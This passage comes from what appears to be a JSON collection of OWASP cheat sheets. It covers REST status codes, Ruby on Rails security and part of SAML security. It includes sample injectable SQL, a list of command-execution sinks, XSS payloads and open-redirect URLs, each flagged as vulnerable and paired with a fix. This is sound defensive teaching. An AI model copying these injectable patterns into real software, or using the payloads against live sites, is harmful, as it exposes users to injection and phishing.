Code\r\n\r\nHTTP defines [status code](https://en.wikipedia.org/wiki/List_of_HTTP_status_codes). When designing REST API, don't just use `200` for success or `404` for error. Always use the semantically appropriate status code for the response.\r\n\r\nHere is a non-exhaustive selection of security related REST API **status codes**. Use it to ensure you return the correct code.\r\n\r\n| Code | Message                | Description                                                                                                                                                                                                          |\r\n|-------------|------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\r\n| 200         | OK                     |  Response to a successful REST API action. The HTTP method can be GET, POST, PUT, PATCH or DELETE.                                                                                                                  |\r\n| 201         | Created                |  The request has been fulfilled and resource created. A URI for the created resource is returned in the Location header.                                                                                            |\r\n| 202         | Accepted               | The request has been accepted for processing, but processing is not yet complete.                                                                                                                                     |\r\n| 301         | Moved Permanently       | Permanent redirection.                                                                                                                                                                                                |\r\n| 304         | Not Modified           | Caching related response that returned when the client has the same copy of the resource as the server.                                                                                                                  |\r\n| 307         | Temporary Redirect     | Temporary redirection of resource.                                                                                                                                                                                   |\r\n| 400         | Bad Request            | The request is malformed, such as message body format error.                                                                                                                                                          |\r\n| 401         | Unauthorized           | Wrong or no authentication ID/password provided.                                                                                                                                                                      |\r\n| 403         | Forbidden              |  It's used when the authentication succeeded but authenticated user doesn't have permission to the request resource.                                                                                                |\r\n| 404         | Not Found              | When a non-existent resource is requested.                                                                                                                                                                            |\r\n| 405         | Method Not Acceptable  |  The error for an unexpected HTTP method. For example, the REST API is expecting HTTP GET, but HTTP PUT is used.                                                                                                    |\r\n| 406         | Unacceptable           | The client presented a content type in the Accept header which is not supported by the server API.                                                                                                                    |\r\n| 413         | Payload too large      | Use it to signal that the request size exceeded the given limit e.g. regarding file uploads.                                                                                                                          |\r\n| 415         | Unsupported Media Type | The requested content type is not supported by the REST service.                                                                                                                                                      |\r\n| 429         | Too Many Requests      |  The error is used when there may be DOS attack detected or the request is rejected due to rate limiting.                                                                                                           |\r\n| 500         | Internal Server Error  | An unexpected condition prevented the server from fulfilling the request. Be aware that the response should not reveal internal  information that helps an attacker, e.g. detailed error messages or  stack traces. |\r\n| 501         | Not Implemented        | The REST service does not implement the requested operation yet.                                                                                                                                                      |\r\n| 503         | Service Unavailable    |  The REST service is temporarily unable to process the request. Used to inform the client it should retry at a later time.                                                                                         |\r\n\r\nAdditional information about HTTP return code usage in REST API can be found [here](https://www.restapitutorial.com/httpstatuscodes.html) and [here](https://restfulapi.net/http-status-codes).\r\n"
    },
    {
      "Ruby_on_Rails_Cheat_Sheet.md": "# Ruby on Rails Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis *Cheatsheet* intends to provide quick basic Ruby on Rails security tips for developers. It complements, augments or emphasizes points brought up in the [Rails security guide](https://guides.rubyonrails.org/security.html) from rails core.\r\n\r\nThe Rails framework abstracts developers from quite a bit of tedious work and provides the means to accomplish complex tasks quickly and with ease. New developers, those unfamiliar with the inner-workings of Rails, likely need a basic set of guidelines to secure fundamental aspects of their application. The intended purpose of this doc is to be that guide.\r\n\r\n## Items\r\n\r\n### Command Injection\r\n\r\nRuby offers a function called \"eval\" which will dynamically build new Ruby code based on Strings. It also has a number of ways to call system commands.\r\n\r\n``` ruby\r\neval(\"ruby code here\")\r\nsystem(\"os command here\")\r\n`ls -al /` # (backticks contain os command)\r\nexec(\"os command here\")\r\nspawn(\"os command here\")\r\nopen(\"| os command here\")\r\nProcess.exec(\"os command here\")\r\nProcess.spawn(\"os command here\")\r\nIO.binread(\"| os command here\")\r\nIO.binwrite(\"| os command here\", \"foo\")\r\nIO.foreach(\"| os command here\") {}\r\nIO.popen(\"os command here\")\r\nIO.read(\"| os command here\")\r\nIO.readlines(\"| os command here\")\r\nIO.write(\"| os command here\", \"foo\")\r\n```\r\n\r\nWhile the power of these commands is quite useful, extreme care should be taken when using them in a Rails based application. Usually, its just a bad idea. If need be, an allow-list of possible values should be used and any input should be validated as thoroughly as possible.\r\n\r\nThe guides from [Rails](https://guides.rubyonrails.org/security.html#command-line-injection) and [OWASP](https://owasp.org/www-community/attacks/Command_Injection) contain further information on command injection.\r\n\r\n### SQL Injection\r\n\r\nRuby on Rails is often used with an ORM called ActiveRecord, though it is flexible and can be used with other data sources. Typically very simple Rails applications use methods on the Rails models to query data. Many use cases protect for SQL Injection out of the box. However, it is possible to write code that allows for SQL Injection.\r\n\r\n``` ruby\r\nname = params[:name]\r\n@projects = Project.where(\"name like '\" + name + \"'\");\r\n```\r\n\r\nThe statement is injectable because the name parameter is not escaped.\r\n\r\nHere is the idiom for building this kind of statement:\r\n\r\n``` ruby\r\n@projects = Project.where(\"name like ?\", \"%#{ActiveRecord::Base.sanitize_sql_like(params[:name])}%\")\r\n```\r\n\r\nUse caution not to build SQL statements based on user controlled input. A list of more realistic and detailed examples is here: [rails-sqli.org](https://rails-sqli.org). OWASP has extensive information about [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection).\r\n\r\n### Cross-site Scripting (XSS)\r\n\r\nBy default, protection against XSS comes as the default behavior. When string data is shown in views, it is escaped prior to being sent back to the browser. This goes a long way, but there are common cases where developers bypass this protection - for example to enable rich text editing. In the event that you want to pass variables to the front end with tags intact, it is tempting to do the following in your .erb file (ruby markup).\r\n\r\n``` ruby\r\n# Wrong! Do not do this!\r\n<%= raw @product.name %>\r\n\r\n# Wrong! Do not do this!\r\n<%== @product.name %>\r\n\r\n# Wrong! Do not do this!\r\n<%= @product.name.html_safe %>\r\n\r\n# Wrong! Do not do this!\r\n<%= content_tag @product.name %>\r\n```\r\n\r\nUnfortunately, any field that uses `raw`, `html_safe`, `content_tag` or similar like this will be a potential XSS target. Note that there are also widespread misunderstandings about `html_safe()`.\r\n\r\n[This writeup](https://stackoverflow.com/questions/4251284/raw-vs-html-safe-vs-h-to-unescape-html) describes the underlying SafeBuffer mechanism in detail. Other tags that change the way strings are prepared for output can introduce similar issues, including content_tag.\r\n\r\n``` ruby\r\ncontent_tag(\"/><script>alert('hack!');</script>\") # XSS example\r\n# produces: </><script>alert('hack!');</script>><//><script>alert('hack!');</script>>\r\n```\r\n\r\nThe method `html_safe` of String is somewhat confusingly named. It means that we know for sure the content of the string is safe to include in HTML without escaping. **This method itself is un-safe!**\r\n\r\nIf you must accept HTML content from users, consider a markup language for rich text in an application (Examples include: Markdown and textile) and disallow HTML tags. This helps ensures that the input accepted doesn't include HTML content that could be malicious.\r\n\r\nIf you cannot restrict your users from entering HTML, consider implementing content security policy to disallow the execution of any JavaScript. And finally, consider using the `#sanitize` method that lets you list allowed tags. Be careful, this method has been shown to be flawed numerous times and will never be a complete solution.\r\n\r\nAn often overlooked XSS attack vector for older versions of rails is the `href` value of a link:\r\n\r\n``` ruby\r\n<%= link_to \"Personal Website\", @user.website %>\r\n```\r\n\r\nIf `@user.website` contains a link that starts with `javascript:`, the content will execute when a user clicks the generated link:\r\n\r\n``` html\r\n<a href=\"javascript:alert('Haxored')\">Personal Website</a>\r\n```\r\n\r\nNewer Rails versions escape such links in a better way.\r\n\r\n``` ruby\r\nlink_to \"Personal Website\", 'javascript:alert(1);'.html_safe()\r\n# Will generate:\r\n# \"<a href=\"javascript:alert(1);\">Personal Website</a>\"\r\n```\r\n\r\nUsing [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) is one more security measure to forbid execution for links starting with `javascript:` .\r\n\r\n[Brakeman scanner](https://github.com/presidentbeef/brakeman) helps in finding XSS problems in Rails apps.\r\n\r\nOWASP provides more general information about XSS in a top level page: [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/).\r\n\r\n### Sessions\r\n\r\nBy default, Ruby on Rails uses a Cookie based session store. What that means is that unless you change something, the session will not expire on the server. That means that some default applications may be vulnerable to replay attacks. It also means that sensitive information should never be put in the session.\r\n\r\nThe best practice is to use a database based session, which thankfully is very easy with Rails:\r\n\r\n``` ruby\r\nProject::Application.config.session_store :active_record_store\r\n```\r\n\r\nThere is an [Session Management Cheat Sheet](Session_Management_Cheat_Sheet.md).\r\n\r\n### Authentication\r\n\r\nAs with all sensitive data, start securing your authentication with enabling TLS in your configuration:\r\n\r\n``` ruby\r\n# config/environments/production.rb\r\n# Force all access to the app over SSL, use Strict-Transport-Security,\r\n# and use secure cookies\r\nconfig.force_ssl = true\r\n```\r\n\r\nUncomment the line 3 as above in your configuration.\r\n\r\nGenerally speaking, Rails does not provide authentication by itself. However, most developers using Rails leverage libraries such as Devise or AuthLogic to provide authentication.\r\n\r\nTo enable authentication it is possible to use Devise gem.\r\n\r\nInstall it using:\r\n\r\n```bash\r\ngem 'devise'\r\n```\r\n\r\nThen install it to the user model:\r\n\r\n```bash\r\nrails generate devise:install\r\n```\r\n\r\nNext, specify which resources (routes) require authenticated access in routes:\r\n\r\n``` ruby\r\nRails.application.routes.draw do\r\n  authenticate :user do\r\n    resources :something do  # these resource require authentication\r\n      ...\r\n    end\r\n  end\r\n\r\n  devise_for :users # sign-up/-in/out routes\r\n\r\n  root to: 'static#home' # no authentication required\r\nend\r\n```\r\n\r\nTo enforce password complexity, it is possible to use [zxcvbn gem](https://github.com/bitzesty/devise_zxcvbn). Configure your user model with it:\r\n\r\n``` ruby\r\nclass User < ApplicationRecord\r\n  devise :database_authenticatable,\r\n    # other devise features, then\r\n    :zxcvbnable\r\nend\r\n```\r\n\r\nAnd configure the required password complexity:\r\n\r\n``` ruby\r\n# in config/initializers/devise.rb\r\nDevise.setup do |config|\r\n  # zxcvbn score for devise\r\n  config.min_password_score = 4 # complexity score here.\r\n  ...\r\n```\r\n\r\nYou can try out [this PoC](https://github.com/qutorial/revise) to learn more about it.\r\n\r\nNext, [omniauth gem](https://github.com/omniauth/omniauth) allows for multiple strategies for authentication. Using it one can configure secure authentication with Facebook, LDAP and many other providers. Read on [here](https://github.com/omniauth/omniauth#integrating-omniauth-into-your-application).\r\n\r\n#### Token Authentication\r\n\r\nDevise usually uses Cookies for authentication.\r\n\r\nIn the case token authentication is wished instead, it could be implemented with a gem [devise_token_auth](https://github.com/lynndylanhurley/devise_token_auth).\r\n\r\nIt supports multiple front end technologies, for example angular2-token.\r\n\r\nThis gem is configured similar to the devise gem itself. It also requires omniauth as a dependency.\r\n\r\n```bash\r\n# token-based authentication\r\ngem 'devise_token_auth'\r\ngem 'omniauth'\r\n```\r\n\r\nThen a route is defined:\r\n\r\n```ruby\r\nmount_devise_token_auth_for 'User', at: 'auth'\r\n```\r\n\r\nAnd the User model is modified accordingly.\r\n\r\nThese actions can be done with one command:\r\n\r\n```bash\r\nrails g devise_token_auth:install [USER_CLASS] [MOUNT_PATH]\r\n```\r\n\r\nYou may need to edit the generated migration to avoid unnecessary fields and/or field duplication depending on your use case.\r\n\r\nNote: when you use only token authentication, there is no more need in [CSRF](https://owasp.org/www-community/attacks/csrf) protection in controllers. If you use both ways: cookies and tokens, the paths where cookies are used for authentication still must be protected from forgery!\r\n\r\nThere is an [Authentication Cheat Sheet](Authentication_Cheat_Sheet.md).\r\n\r\n### Insecure Direct Object Reference or Forceful Browsing\r\n\r\nBy default, Ruby on Rails apps use a RESTful URI structure. That means that paths are often intuitive and guessable. To protect against a user trying to access or modify data that belongs to another user, it is important to specifically control actions. Out of the gate on a vanilla Rails application, there is no such built-in protection. It is possible to do this by hand at the controller level.\r\n\r\nIt is also possible, and probably recommended, to consider resource-based access control libraries such as [cancancan](https://github.com/CanCanCommunity/cancancan) (cancan replacement) or [pundit](https://github.com/elabs/pundit) to do this. This ensures that all operations on a database object are authorized by the business logic of the application.\r\n\r\nMore general information about this class of vulnerability is in the [OWASP Top 10 Page](https://wiki.owasp.org/index.php/Top_10_2010-A4-Insecure_Direct_Object_References).\r\n\r\n### CSRF (Cross Site Request Forgery)\r\n\r\nRuby on Rails has specific, built-in support for CSRF tokens. To enable it, or ensure that it is enabled, find the base `ApplicationController` and look for a directive such as the following:\r\n\r\n``` ruby\r\nclass ApplicationController < ActionController::Base\r\n  protect_from_forgery\r\n```\r\n\r\nNote that the syntax for this type of control includes a way to add exceptions. Exceptions may be useful for APIs or other reasons - but should be reviewed and consciously included. In the example below, the Rails ProjectController will not provide [CSRF](https://owasp.org/www-community/attacks/csrf) protection for the show method.\r\n\r\n``` ruby\r\nclass ProjectController < ApplicationController\r\n  protect_from_forgery except: :show\r\n```\r\n\r\nAlso note that by default Rails does not provide CSRF protection for any HTTP `GET` request.\r\n\r\n**Note:** if you use token authentication only, there is no need to protect from CSRF in controllers like this. If cookie-based authentication is used on some paths, then the protections is still required on them.\r\n\r\nThere is a top level OWASP page for [Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf).\r\n\r\n### Redirects and Forwards\r\n\r\nWeb applications often require the ability to dynamically redirect users based on client-supplied data. To clarify, dynamic redirection usually entails the client including a URL in a parameter within a request to the application. Once received by the application, the user is redirected to the URL specified in the request.\r\n\r\nFor example:\r\n\r\n`http://www.example.com/redirect?url=http://www.example_commerce_site.com/checkout`\r\n\r\nThe above request would redirect the user to `http://www.example.com/checkout`. The security concern associated with this functionality is leveraging an organization's trusted brand to phish users and trick them into visiting a malicious site, in our example, `badhacker.com`.\r\n\r\nExample:\r\n\r\n`http://www.example.com/redirect?url=http://badhacker.com`\r\n\r\nThe most basic, but restrictive protection is to use the `:only_path` option. Setting this to true will essentially strip out any host information. However, the `:only_path` option must be part of the first argument. If the first argument is not a hash table, then there is no way to pass in this option. In the absence of a custom helper or allow list, this is one approach that can work:\r\n\r\n``` ruby\r\nbegin\r\n  if path = URI.parse(params[:url]).path\r\n    redirect_to path\r\n  end\r\nrescue URI::InvalidURIError\r\n  redirect_to '/'\r\nend\r\n```\r\n\r\nIf matching user input against a list of approved sites or TLDs against regular expression is a must, it makes sense to leverage a library such as `URI.parse()` to obtain the host and then take the host value and match it against regular expression patterns. Those regular expressions must, at a minimum, have anchors or there is a greater chance of an attacker bypassing the validation routine.\r\n\r\nExample:\r\n\r\n``` ruby\r\nrequire 'uri'\r\nhost = URI.parse(\"#{params[:url]}\").host\r\n# this can be vulnerable to javascript://trusted.com/%0Aalert(0)\r\n# so check .scheme and .port too\r\nvalidation_routine(host) if host\r\ndef validation_routine(host)\r\n  # Validation routine where we use  \\A and \\z as anchors *not* ^ and $\r\n  # you could also check the host value against an allow list\r\nend\r\n```\r\n\r\nAlso blind redirecting to user input parameter can lead to XSS.\r\n\r\nExample code:\r\n\r\n``` ruby\r\nredirect_to params[:to]\r\n```\r\n\r\nWill give this URL:\r\n\r\n`http://example.com/redirect?to[status]=200&to[protocol]=javascript:alert(0)//`\r\n\r\nThe obvious fix for this type of vulnerability is to restrict to specific Top-Level Domains (TLDs), statically define specific sites, or map a key to it's value.\r\n\r\nExample code:\r\n\r\n``` ruby\r\nACCEPTABLE_URLS = {\r\n  'our_app_1' => \"https://www.example_commerce_site.com/checkout\",\r\n  'our_app_2' => \"https://www.example_user_site.com/change_settings\"\r\n}\r\n```\r\n\r\nWill give this URL:\r\n\r\n`http://www.example.com/redirect?url=our_app_1`\r\n\r\nRedirection handling code:\r\n\r\n``` ruby\r\ndef redirect\r\n  url = ACCEPTABLE_URLS[\"#{params[:url]}\"]\r\n  redirect_to url if url\r\nend\r\n```\r\n\r\nThere is a more general OWASP resource about [unvalidated redirects and forwards](Unvalidated_Redirects_and_Forwards_Cheat_Sheet.md).\r\n\r\n### Dynamic Render Paths\r\n\r\nIn Rails, controller actions and views can dynamically determine which view or partial to render by calling the `render` method. If user input is used in or for the template name, an attacker could cause the application to render an arbitrary view, such as an administrative page.\r\n\r\nCare should be taken when using user input to determine which view to render. If possible, avoid any user input in the name or path to the view.\r\n\r\n### Cross Origin Resource Sharing\r\n\r\nOccasionally, a need arises to share resources with another domain. For example, a file-upload function that sends data via an AJAX request to another domain. In these cases, the same-origin rules followed by web browsers must be sent. Modern browsers, in compliance with HTML5 standards, will allow this to occur but in order to do this; a couple precautions must be taken.\r\n\r\nWhen using a nonstandard HTTP construct, such as an atypical Content-Type header, for example, the following applies:\r\n\r\nThe receiving site should list only those domains allowed to make such requests as well as set the `Access-Control-Allow-Origin` header in both the response to the `OPTIONS` request and `POST` request. This is because the OPTIONS request is sent first, in order to determine if the remote or receiving site allows the requesting domain. Next, a second request, a `POST` request, is sent. Once again, the header must be set in order for the transaction to be shown as successful.\r\n\r\nWhen standard HTTP constructs are used:\r\n\r\n*The request is sent and the browser, upon receiving a response, inspects the response headers in order to determine if the response can and should be processed.*\r\n\r\nAllow list in Rails:\r\n\r\n**Gemfile:**\r\n\r\n```bash\r\ngem 'rack-cors', :require => 'rack/cors'\r\n```\r\n\r\n**config/application.rb:**\r\n\r\n```ruby\r\nmodule Sample\r\n  class Application < Rails::Application\r\n    config.middleware.use Rack::Cors do\r\n      allow do\r\n        origins 'someserver.example.com'\r\n        resource %r{/users/\\d+.json},\r\n        :headers => ['Origin', 'Accept', 'Content-Type'],\r\n        :methods => [:post, :get]\r\n      end\r\n    end\r\n  end\r\nend\r\n```\r\n\r\n### Security-related headers\r\n\r\nTo set a header value, simply access the response.headers object as a hash inside your controller (often in a before/after_filter).\r\n\r\n```ruby\r\nresponse.headers['X-header-name'] = 'value'\r\n```\r\n\r\nRails provides the `default_headers` functionality that will automatically apply the values supplied. This works for most headers in almost all cases.\r\n\r\n```ruby\r\nActionDispatch::Response.default_headers = {\r\n  'X-Frame-Options' => 'SAMEORIGIN',\r\n  'X-Content-Type-Options' => 'nosniff',\r\n  'X-XSS-Protection' => '0'\r\n}\r\n```\r\n\r\n[Strict transport security](https://owasp.org/www-project-secure-headers/#headers-link) is a special case, it is set in an environment file (e.g. `production.rb`)\r\n\r\n```ruby\r\nconfig.force_ssl = true\r\n```\r\n\r\nFor those not on the edge, there is a library ([secure_headers](https://github.com/twitter/secureheaders)) for the same behavior with content security policy abstraction provided. It will automatically apply logic based on the user agent to produce a concise set of headers.\r\n\r\n### Business Logic Bugs\r\n\r\nAny application in any technology can contain business logic errors that result in security bugs. Business logic bugs are difficult to impossible to detect using automated tools. The best ways to prevent business logic security bugs are to do code review, pair program and write unit tests.\r\n\r\n### Attack Surface\r\n\r\nGenerally speaking, Rails avoids open redirect and path traversal types of vulnerabilities because of its /config/routes.rb file which dictates what URLs should be accessible and handled by which controllers. The routes file is a great place to look when thinking about the scope of the attack surface.\r\n\r\nAn example might be as follows:\r\n\r\n```ruby\r\n# this is an example of what NOT to do\r\nmatch ':controller(/:action(/:id(.:format)))'\r\n```\r\n\r\nIn this case, this route allows any public method on any controller to be called as an action. As a developer, you want to make sure that users can only reach the controller methods intended and in the way intended.\r\n\r\n### Sensitive Files\r\n\r\nMany Ruby on Rails apps are open source and hosted on publicly available source code repositories. Whether that is the case or the code is committed to a corporate source control system, there are certain files that should be either excluded or carefully managed.\r\n\r\n```text\r\n/config/database.yml                 -  May contain production credentials.\r\n/config/initializers/secret_token.rb -  Contains a secret used to hash session cookie.\r\n/db/seeds.rb                         -  May contain seed data including bootstrap admin user.\r\n/db/development.sqlite3              -  May contain real data.\r\n```\r\n\r\n### Encryption\r\n\r\nRails uses OS encryption. Generally speaking, it is always a bad idea to write your own encryption.\r\n\r\nDevise by default uses bcrypt for password hashing, which is an appropriate solution.\r\n\r\nTypically, the following config causes the 10 stretches for production: `/config/initializers/devise.rb`\r\n\r\n```ruby\r\nconfig.stretches = Rails.env.test? ? 1 : 10\r\n```\r\n\r\n## Updating Rails and Having a Process for Updating Dependencies\r\n\r\nIn early 2013, a number of critical vulnerabilities were identified in the Rails Framework. Organizations that had fallen behind current versions had more trouble updating and harder decisions along the way, including patching the source code for the framework itself.\r\n\r\nAn additional concern with Ruby applications in general is that most libraries (gems) are not signed by their authors. It is literally impossible to build a Rails based project with libraries that come from trusted sources. One good practice might be to audit the gems you are using.\r\n\r\nIn general, it is important to have a process for updating dependencies. An example process might define three mechanisms for triggering an update of response:\r\n\r\n- Every month/quarter dependencies in general are updated.\r\n- Every week important security vulnerabilities are taken into account and potentially trigger an update.\r\n- In EXCEPTIONAL conditions, emergency updates may need to be applied.\r\n\r\n## Tools\r\n\r\nUse [brakeman](https://brakemanscanner.org/), an open source code analysis tool for Rails applications, to identify many potential issues. It will not necessarily produce comprehensive security findings, but it can find easily exposed issues. A great way to see potential issues in Rails is to review the brakeman documentation of warning types.\r\n\r\nA newer alternative is [bearer](https://github.com/Bearer/bearer), an open source code security and privacy analysis tool for both Ruby and JavaScript/TypeScript code, in order to identify a broad range of OWASP Top 10 potential issues. It provides many configuration options and can easily integrate into your CI/CD pipeline.\r\n\r\nThere are emerging tools that can be used to track security issues in dependency sets, like automated scanning from [GitHub](https://github.blog/2017-11-16-introducing-security-alerts-on-github/) and [GitLab](https://docs.gitlab.com/ee/user/application_security/dependency_scanning/).\r\n\r\nAnother area of tooling is the security testing tool [Gauntlt](http://gauntlt.org) which is built on cucumber and uses gherkin syntax to define attack files.\r\n\r\nLaunched in May 2013 and very similar to brakeman scanner, the [dawnscanner](https://github.com/thesp0nge/dawnscanner) rubygem is a static analyzer for security issues that work with Rails, Sinatra and Padrino web applications. Version 1.6.6 has more than 235 ruby specific CVE security checks.\r\n\r\n## Related Articles and References\r\n\r\n- [The Official Rails Security Guide](https://guides.rubyonrails.org/security.html)\r\n- [OWASP Ruby on Rails Security Guide](https://owasp.org/www-pdf-archive/Rails_Security_2.pdf)\r\n- [The Ruby Security Reviewers Guide](http://code.google.com/p/ruby-security/wiki/Guide)\r\n- [The Ruby on Rails Security Mailing List](https://groups.google.com/forum/?fromgroups#!forum/rubyonrails-security)\r\n- [Rails Insecure Defaults](https://codeclimate.com/blog/rails-insecure-defaults/)\r\n"
    },
    {
      "SAML_Security_Cheat_Sheet.md": "# SAML Security Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThe **S**ecurity **A**ssertion **M**arkup **L**anguage ([SAML](https://en.wikipedia.org/wiki/Security_Assertion_Markup_Language)) is an open standard for exchanging authorization and authentication information. The *Web Browser SAML/SSO Profile with Redirect/POST bindings* is one of the most common SSO implementation. This cheatsheet will focus primarily on that profile.\r\n\r\n## Validate Message Confidentiality and Integrity\r\n\r\n[TLS 1.2](Transport_Layer_Protection_Cheat_Sheet.md) is the most common solution to guarantee message confidentiality and integrity at the transport layer. Refer to [SAML Security (section 4.2.1)](https://docs.oasis-open.org/security/saml/v2.0/saml-sec-consider-2.0-os.pdf) for additional information. This step will help counter the following attacks:\r\n\r\n- Eavesdropping 7.1.1.1\r\n- Theft of User Authentication Information 7.1.1.2\r\n- Theft of the Bearer Token 7.1.1.3\r\n- Message Deletion 7.1.1.6\r\n- Message Modification 7.1.1.7\r\n- Man-in-the-middle 7.1.1.8\r\n\r\nA digitally signed message with a certified key is the most common solution to guarantee message integrity and authentication. Refer to [SAML Security (section 4.3)](https://docs.oasis-open.org/security/saml/v2.0/saml-sec-consider-2.0-os.pdf) for additional information. This step will help counter the following attacks:\r\n\r\n- Man-in-the-middle 6.4.2\r\n- Forged Assertion 6.4.3\r\n- Message Modification 7.1.1.7\r\n\r\nAssertions may be encrypted via XMLEnc to prevent disclosure of sensitive attributes post transportation. Refer to [SAML Security (section 4.2.2)](https://docs.oasis-open.org/security/saml/v2.0/saml-sec-consider-2.0-os.pdf) for additional information. This step will help counter the following attacks:\r\n\r\n- Theft of User Authentication Information 7.1.1.2\r\n\r\n## Validate Protocol Usage\r\n\r\nThis is a common area for security gaps - see [Google SSO vulnerability](https://www.kb.cert.org/vuls/id/612636/) for a real life example. Their SSO profile was vulnerable to a Man-in-the-middle attack from a malicious SP (Service Provider).\r\n\r\nThe SSO Web Browser Profile is most susceptible to attacks from trusted partners. This particular security flaw was exposed because the SAML Response did not contain all of the required data elements necessary for a secure message exchange. Following the [SAML Profile](https://docs.oasis-open.org/security/saml/v2.0/saml-profiles-2.0-os.pdf) usage requirements for AuthnRequest (4.1.4.1) and Response (4.1.4.2) will help counter this attack.\r\n\r\nThe *AVANTSSAR* team suggested the following data elements should be required:\r\n\r\n- **AuthnRequest(ID, SP):** An `AuthnRequest` must contain and `ID` and `SP`. Where `ID` is a string uniquely identifying the request and an `SP` identifies the `Service Provider` that initiated the request. Furthermore, the request `ID` attribute must be returned in the response (`InResponseTo=\"<requestId>\"`). `InResponseTo` helps guarantee authenticity of the response from the trusted IdP. This was one of the missing attributes that left Google's SSO vulnerable.\r\n- **Response(ID, SP, IdP, {AA} K -1/IdP):** A Response must contain all these elements. Where `ID` is a string uniquely identifying the response. `SP` identifies the recipient of the response. `IdP` identifies the identity provider authorizing the response. `{AA} K -1/IdP` is the assertion digitally signed with the private key of the `IdP`.\r\n- **AuthAssert(ID, C, IdP, SP):** An authentication assertion must exist within the Response. It must contain an `ID`, a client `(C)`, an identity provider `(IdP)`, and a service provider `(SP)` identifier.\r\n\r\n### Validate Signatures\r\n\r\nVulnerabilities in SAML implementations due to XML Signature Wrapping attacks were described in 2012, [On Breaking SAML: Be Whoever You Want to Be](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91-8-23-12.pdf).\r\n\r\nThe following recommendations were proposed in response ([Secure SAML validation to prevent XML signature wrapping attacks](https://arxiv.org/pdf/1401.7483v1.pdf)):\r\n\r\n- Always perform schema validation on the XML document prior to using it for any security-­related purposes:\r\n    - Always use local, trusted copies of schemas for validation.\r\n    - Never allow automatic download of schemas from third party locations.\r\n    - If possible, inspect schemas and perform schema hardening, to disable possible wildcard ­type or relaxed processing statements.\r\n- Securely validate the digital signature:\r\n    - If you expect only one signing key, use `StaticKeySelector`. Obtain the key directly from the identity provider, store it in local file and ignore any `KeyInfo` elements in the document.\r\n    - If you expect more than one signing key, use `X509KeySelector` (the JKS variant). Obtain these keys directly form the identity providers, store them in local JKS and ignore any `KeyInfo` elements in the document.\r\n    - If you expect a heterogeneous signed documents (many certificates from many identity providers, multi­level validation paths), implement full trust establishment model based on PKIX and trusted root certificates.\r\n- Avoid signature-wrapping attacks.\r\n    - Never use `getElementsByTagName` to select security related elements in an XML document without prior validation.\r\n    - Always use absolute XPath expressions to select elements, unless a hardened schema is used for validation.\r\n\r\n## Validate Protocol Processing Rules\r\n\r\nThis is another common area for security gaps simply because of the vast number of steps to assert.\r\n\r\nProcessing a SAML response is an expensive operation but all steps must be validated:\r\n\r\n- Validate AuthnRequest processing rules. Refer to [SAML Core](https://docs.oasis-open.org/security/saml/v2.0/saml-core-2.0-os.pdf) (3.4.1.4) for all AuthnRequest processing rules. This step will help counter the following attacks:\r\n    - Man-in-the-middle (6.4.2)\r\n- Validate Response processing rules. Refer to [SAML Profiles](https://docs.oasis-open.org/security/saml/v2.0/saml-profiles-2.0-os.pdf) (4.1.4.3) for all Response processing rules. This step will help counter the following attacks:\r\n    - Stolen Assertion (6.4.1)\r\n    - Man-in-the-middle (6.4.2)\r\n    - Forged Assertion (6.4.3)\r\n    - Browser State Exposure (6.4.4)\r\n\r\n## Validate Binding Implementation\r\n\r\n- For an HTTP Redirect Binding refer to [SAML Binding](https://docs.oasis-open.org/security/saml/v2.0/saml-bindings-2.0-os.pdf) (3.4). To view an encoding example, you may want to reference RequestUtil.java found within [Google's reference implementation](https://developers.google.com/google-apps/sso/saml_reference_implementation_web).\r\n- For an HTTP POST Binding refer to [SAML Binding](https://docs.oasis-open.org/security/saml/v2.0/saml-bindings-2.0-os.pdf) (3.5). The caching considerations are also very important. If a SAML protocol message gets cached, it can subsequently be used as a Stolen Assertion (6.4.1) or Replay (6.4.5) attack.\r\n\r\n## Validate Security Countermeasures\r\n\r\nRevisit each security threat that exists within the [SAML Security](https://docs.oasis-open.org/security/saml/v2.0/saml-sec-consider-2.0-os.pdf) document and assert you have applied the appropriate countermeasures for threats that may exist for your particular implementation.\r\n\r\nAdditional countermeasures considered should include:\r\n\r\n- Prefer IP Filtering when appropriate. For example, this countermeasure could have prevented Google's initial security flaw if Google provided each trusted partner with a separate endpoint and setup an IP filter for each endpoint. This step will help counter the following attacks:\r\n    - Stolen Assertion (6.4.1)\r\n    - Man-in-the-middle (6.4.2)\r\n- Prefer short lifetimes on the SAML Response. This step will help counter the following attacks:\r\n    - Stolen Assertion (6.4.1)\r\n    - Browser State Exposure (6.4.4)\r\n- Prefer OneTimeUse on the SAML Response. This step will help counter the following attacks:\r\n    - Browser State Exposure (6.4.4)\r\n    - Replay (6.4.5)\r\n\r\nNeed an architectural diagram? The [SAML technical overview](https://www.oasis-open.org/committees/download.php/11511/sstc-saml-tech-overview-2.0-draft-03.pdf) contains the most complete diagrams. For the Web Browser SSO Profile with Redirect/POST bindings refer to the section 4.1.3. In fact, of all the SAML documentation, the technical overview is the most valuable from a high-level perspective.\r\n\r\n## Unsolicited Response (ie. IdP Initiated SSO) Considerations for Service Providers\r\n\r\nUnsolicited Response is inherently [less secure](https://www.identityserver.com/articles/the-dangers-of-saml-idp-initiated-sso) by design due to the lack of [CSRF](https://owasp.org/www-community/attacks/csrf) protection. However, it is supported by many due to the backwards compatibility feature of SAML 1.1. The general security recommendation is to not support this type of authentication, but if it must be enabled, the following steps (in additional to everything mentioned above) should help you secure this flow:\r\n\r\n- Follow the validation process mentioned in [SAML Profiles (section 4.1.5)](https://docs.oasis-open.org/security/saml/v2.0/saml-profiles-2.0-os.pdf). This step will help counter the following attacks:\r\n    - Replay (6.1.2)\r\n    - Message Insertion (6.1.3)\r\n- If the contract of the `RelayState` parameter is a URL, make sure the URL is validated and explicitly on an allow list. This step will help counter the following attack:\r\n    - [Open Redirect](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)\r\n- Implement proper replay detection either at the response or assertion level. This will help counter the following attack:\r\n    - Replay (6.1.2)\r\n\r\n## Identity Provider and Service Provider Considerations\r\n\r\nThe SAML protocol is rarely the vector of choice, though it's important to have cheatsheets to make sure that this is robust. The various endpoints are more targeted, so how 